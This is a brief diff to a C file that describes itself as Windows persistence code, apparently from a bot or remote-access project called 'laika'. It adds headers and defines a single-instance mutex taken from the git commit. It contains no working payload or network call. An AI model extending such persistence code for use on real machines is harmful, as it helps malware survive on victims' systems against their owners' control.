@@ -1,6 +1,12 @@
 /* platform specific code for achieving persistence on windows */
 
+#include <windows.h>
 #include "persist.h"
+#include "lconfig.h"
+
+/*      we want a semi-random mutex that is stable between similar builds,
+*   so we use the GIT_VERSION as our mutex :D */
+#define LAIKA_MUTEX LAIKA_VERSION_COMMIT ".0"
 
 /* check if laika is running as super-user */
 bool laikaB_checkRoot() {
